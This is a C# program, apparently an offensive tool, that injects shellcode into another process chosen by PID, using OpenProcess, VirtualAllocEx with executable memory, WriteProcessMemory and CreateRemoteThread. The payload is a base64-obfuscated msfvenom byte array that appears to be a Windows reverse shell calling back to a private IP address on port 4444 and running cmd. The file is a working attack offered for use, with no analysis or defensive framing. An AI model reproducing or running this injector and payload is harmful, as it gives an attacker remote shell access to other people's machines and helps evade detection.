using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
namespace RemotmeInjection
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: binary [PID of process to migrate to]");
                Environment.Exit(0);
            }
            int PID = Int32.Parse(args[0]);
            //base64 msfvenom, just the array part without parantheses (ie: 0x00, 0x00, 0x00), without whitespace.
            String base64Text = "MHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwweDU2LDB4NDgsMHgzMSwweGQyLDB4NjUsMHg0OCwweDhiLDB4NTIsMHg2MCwweDQ4LDB4OGIsMHg1MiwweDE4LDB4NDgsMHg4YiwweDUyLDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLDB4ZTIsMHhlZCwweDUyLDB4NDEsMHg1MSwweDQ4LDB4OGIsMHg1MiwweDIwLDB4OGIsMHg0MiwweDNjLDB4NDgsMHgwMSwweGQwLDB4OGIsMHg4MCwweDg4LDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4NSwweGMwLDB4NzQsMHg2NywweDQ4LDB4MDEsMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4NDQsMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwweDAxLDB4ZDYsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLDB4MzgsMHhlMCwweDc1LDB4ZjEsMHg0YywweDAzLDB4NGMsMHgyNCwweDA4LDB4NDUsMHgzOSwweGQxLDB4NzUsMHhkOCwweDU4LDB4NDQsMHg4YiwweDQwLDB4MjQsMHg0OSwweDAxLDB4ZDAsMHg2NiwweDQxLDB4OGIsMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwweDAxLDB4ZDAsMHg0MSwweDhiLDB4MDQsMHg4OCwweDQ4LDB4MDEsMHhkMCwweDQxLDB4NTgsMHg0MSwweDU4LDB4NWUsMHg1OSwweDVhLDB4NDEsMHg1OCwweDQxLDB4NTksMHg0MSwweDVhLDB4NDgsMHg4MywweGVjLDB4MjAsMHg0MSwweDUyLDB4ZmYsMHhlMCwweDU4LDB4NDEsMHg1OSwweDVhLDB4NDgsMHg4YiwweDEyLDB4ZTksMHg1NywweGZmLDB4ZmYsMHhmZiwweDVkLDB4NDksMHhiZSwweDc3LDB4NzMsMHgzMiwweDVmLDB4MzMsMHgzMiwweDAwLDB4MDAsMHg0MSwweDU2LDB4NDksMHg4OSwweGU2LDB4NDgsMHg4MSwweGVjLDB4YTAsMHgwMSwweDAwLDB4MDAsMHg0OSwweDg5LDB4ZTUsMHg0OSwweGJjLDB4MDIsMHgwMCwweDExLDB4NWMsMHgwYSwweDZlLDB4ZDMsMHhlNywweDQxLDB4NTQsMHg0OSwweDg5LDB4ZTQsMHg0YywweDg5LDB4ZjEsMHg0MSwweGJhLDB4NGMsMHg3NywweDI2LDB4MDcsMHhmZiwweGQ1LDB4NGMsMHg4OSwweGVhLDB4NjgsMHgwMSwweDAxLDB4MDAsMHgwMCwweDU5LDB4NDEsMHhiYSwweDI5LDB4ODAsMHg2YiwweDAwLDB4ZmYsMHhkNSwweDUwLDB4NTAsMHg0ZCwweDMxLDB4YzksMHg0ZCwweDMxLDB4YzAsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzIsMHg0OCwweGZmLDB4YzAsMHg0OCwweDg5LDB4YzEsMHg0MSwweGJhLDB4ZWEsMHgwZiwweGRmLDB4ZTAsMHhmZiwweGQ1LDB4NDgsMHg4OSwweGM3LDB4NmEsMHgxMCwweDQxLDB4NTgsMHg0YywweDg5LDB4ZTIsMHg0OCwweDg5LDB4ZjksMHg0MSwweGJhLDB4OTksMHhhNSwweDc0LDB4NjEsMHhmZiwweGQ1LDB4NDgsMHg4MSwweGM0LDB4NDAsMHgwMiwweDAwLDB4MDAsMHg0OSwweGI4LDB4NjMsMHg2ZCwweDY0LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDgsMHg4OSwweGUyLDB4NTcsMHg1NywweDU3LDB4NGQsMHgzMSwweGMwLDB4NmEsMHgwZCwweDU5LDB4NDEsMHg1MCwweGUyLDB4ZmMsMHg2NiwweGM3LDB4NDQsMHgyNCwweDU0LDB4MDEsMHgwMSwweDQ4LDB4OGQsMHg0NCwweDI0LDB4MTgsMHhjNiwweDAwLDB4NjgsMHg0OCwweDg5LDB4ZTYsMHg1NiwweDUwLDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0MSwweDUwLDB4NDksMHhmZiwweGMwLDB4NDEsMHg1MCwweDQ5LDB4ZmYsMHhjOCwweDRkLDB4ODksMHhjMSwweDRjLDB4ODksMHhjMSwweDQxLDB4YmEsMHg3OSwweGNjLDB4M2YsMHg4NiwweGZmLDB4ZDUsMHg0OCwweDMxLDB4ZDIsMHg0OCwweGZmLDB4Y2EsMHg4YiwweDBlLDB4NDEsMHhiYSwweDA4LDB4ODcsMHgxZCwweDYwLDB4ZmYsMHhkNSwweGJiLDB4ZTAsMHgxZCwweDJhLDB4MGEsMHg0MSwweGJhLDB4YTYsMHg5NSwweGJkLDB4OWQsMHhmZiwweGQ1LDB4NDgsMHg4MywweGM0LDB4MjgsMHgzYywweDA2LDB4N2MsMHgwYSwweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNQ==";

            byte[] buf = new byte[460];
            String hex = "";
            int loopCounter = 1;
            int bufIndex = 0;

            IntPtr output;
            foreach (char item in System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64Text)))
            {
                if (loopCounter % 5 != 0)
                {
                    hex += item;
                }
                if (loopCounter % 5 == 0)
                {
                    int number = Convert.ToInt32(hex, 16);
                    buf[bufIndex] = (byte)number;
                    hex = "";
                    bufIndex++;
                }
                if (loopCounter == System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64Text)).Length)
                {
                    int number = Convert.ToInt32(hex, 16);
                    buf[bufIndex] = (byte)number;
                }

                loopCounter++;
            }

            try
            {
                IntPtr ProcessHandle = OpenProcess(0x001F0FFF, false, PID);
                IntPtr ProcessAddress = VirtualAllocEx(ProcessHandle, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
                WriteProcessMemory(ProcessHandle, ProcessAddress, buf, buf.Length, out output);
                CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, ProcessAddress, IntPtr.Zero, 0, IntPtr.Zero);
            }
            catch
            {
                Console.WriteLine("Probably didn't have enough privilege for that PID");
            }
        }
    }
}
